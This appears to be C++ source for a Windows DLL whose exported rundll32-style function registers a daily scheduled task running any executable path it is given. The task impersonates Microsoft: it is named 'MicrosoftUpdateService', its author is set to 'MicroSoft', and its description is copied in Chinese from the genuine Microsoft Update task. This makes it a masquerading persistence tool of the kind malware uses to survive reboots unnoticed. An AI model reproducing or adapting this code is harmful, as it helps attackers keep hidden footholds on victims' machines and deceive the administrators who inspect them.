#define _WIN32_DCOM
#define _CRT_SECURE_NO_WARNINGS


#include <windows.h>
#include<stdio.h>
#include<taskschd.h>
#include <string>
#include<comdef.h>
#include<iostream>
#include<TlHelp32.h>
using namespace std;

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "credui.lib")

BOOL CreateTask(string wstrExecutablePath) {

    const char* wszDescription = "更新程序使你的 Microsoft 软件保持最新状态。如果此任务已禁用或停止，则 Microsoft 软件将无法保持最新状态，这意味着无法修复可能产生的安全漏洞，并且功能也可能无法使用。如果没有 Microsoft 软件使用此任务，则此任务将自行卸载。";

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        printf("\nCoInitializeEx failed: %x", hr);
        return 1;
    }

    //  Set general COM security levels.
    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        0,
        NULL);

    if (FAILED(hr))
    {
        printf("\nCoInitializeSecurity failed: %x", hr);
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Create a name for the task.
    LPCWSTR wszTaskName = L"MicrosoftUpdateService";



    //  ------------------------------------------------------
    //  Create an instance of the Task Service. 
    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);
    if (FAILED(hr))
    {
        printf("Failed to create an instance of ITaskService: %x", hr);
        CoUninitialize();
        return 1;
    }

    //  Connect to the task service.
    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        printf("ITaskService::Connect failed: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Get the pointer to the root task folder.  This folder will hold the
    //  new task that is registered.
    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        printf("Cannot get Root Folder pointer: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }

    // If the same task exists, remove it.
    pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);

    //  Create the task builder object to create the task.
    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);

    pService->Release();  // COM clean up.  Pointer is no longer used.
    if (FAILED(hr))
    {
        printf("Failed to CoCreate an instance of the TaskService class: %x", hr);
        pRootFolder->Release();
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Get the registration info for setting the identification.
    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (FAILED(hr))
    {
        printf("\nCannot get identification pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pRegInfo->put_Author(_bstr_t(L"MicroSoft"));
    hr = pRegInfo->put_Description(_bstr_t(wszDescription));
    pRegInfo->Release();  // COM clean up.  Pointer is no longer used.
    if (FAILED(hr))
    {
        printf("\nCannot put identification info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  ------------------------------------------------------
    //  Get the trigger collection to insert the daily trigger.
    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTask->get_Triggers(&pTriggerCollection);
    if (FAILED(hr))
    {
        printf("\nCannot get trigger collection: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  Add the daily trigger to the task.
    ITrigger* pTrigger = NULL;
    hr = pTriggerCollection->Create(TASK_TRIGGER_DAILY, &pTrigger);
    pTriggerCollection->Release();
    if (FAILED(hr))
    {
        printf("\nCannot create the trigger: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IDailyTrigger* pDailyTrigger = NULL;
    hr = pTrigger->QueryInterface(
        IID_IDailyTrigger, (void**)&pDailyTrigger);
    pTrigger->Release();
    if (FAILED(hr))
    {
        printf("\nQueryInterface call on IDailyTrigger failed: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pDailyTrigger->put_Id(_bstr_t(L"Trigger1"));
    if (FAILED(hr))
        printf("\nCannot put trigger ID: %x", hr);

    //  Set the task to start daily at a certain time. The time 
    //  format should be YYYY-MM-DDTHH:MM:SS(+-)(timezone).
    //  For example, the start boundary below
    //  is January 1st 2005 at 12:05
    hr = pDailyTrigger->put_StartBoundary(_bstr_t(L"2022-03-31T16:10:00"));
    if (FAILED(hr))
        printf("\nCannot put start boundary: %x", hr);

    //  Set the time when the trigger is deactivated.
    hr = pDailyTrigger->put_EndBoundary(_bstr_t(L"2100-05-02T12:05:00"));
    if (FAILED(hr))
        printf("\nCannot put the end boundary: %x", hr);

    //  Define the interval for the daily trigger. An interval of 2 produces an
    //  every other day schedule
    hr = pDailyTrigger->put_DaysInterval((short)1);
    if (FAILED(hr))
    {
        printf("\nCannot put days interval: %x", hr);
        pRootFolder->Release();
        pDailyTrigger->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    // Add a repetition to the trigger so that it repeats
    // five times.
    IRepetitionPattern* pRepetitionPattern = NULL;
    hr = pDailyTrigger->get_Repetition(&pRepetitionPattern);
    pDailyTrigger->Release();
    if (FAILED(hr))
    {
        printf("\nCannot get repetition pattern: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pRepetitionPattern->put_Duration(_bstr_t(L"PT12M"));
    if (FAILED(hr))
    {
        printf("\nCannot put repetition duration: %x", hr);
        pRootFolder->Release();
        pRepetitionPattern->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //每一分钟触发一次
    //hr = pRepetitionPattern->put_Interval(_bstr_t(L"PT1M"));
    pRepetitionPattern->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put repetition interval: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }


    //  ------------------------------------------------------
    //  Add an action to the task. This task will execute notepad.exe.     
    IActionCollection* pActionCollection = NULL;

    //  Get the task action collection pointer.
    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr))
    {
        printf("\nCannot get task collection pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  Create the action, specifying that it is an executable action.
    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr))
    {
        printf("\nCannot create action: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IExecAction* pExecAction = NULL;
    hr = pAction->QueryInterface(
        IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr))
    {
        printf("\nQueryInterface call failed for IExecAction: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    //  Set the path of the executable to notepad.exe.
    hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath.c_str()));
    pExecAction->Release();
    if (FAILED(hr))
    {
        printf("\nCannot put the executable path: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }
    //  ------------------------------------------------------
    //  Save the task in the root folder.
    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(wszTaskName),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask);
    if (FAILED(hr))
    {
        printf("\nError saving the Task : %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    printf("\n Success! Task successfully registered. ");

    //  Clean up
    pRootFolder->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();
}


extern "C" __declspec(dllexport)
void Task(
    HWND hwnd,        // handle to owner window   
    HINSTANCE hinst,  // instance handle for the DLL   
    LPTSTR lpCmdLine, // string the DLL will parse   
    int nCmdShow      // show state   
)
{
    if (strlen(lpCmdLine) != 0)
    {
        CreateTask(lpCmdLine);
    }
    else
    {
        exit(-1);
    }

    
}



BOOL APIENTRY DllMain(HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPWSTR lpCmdLine,
                       int nCmdShow
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

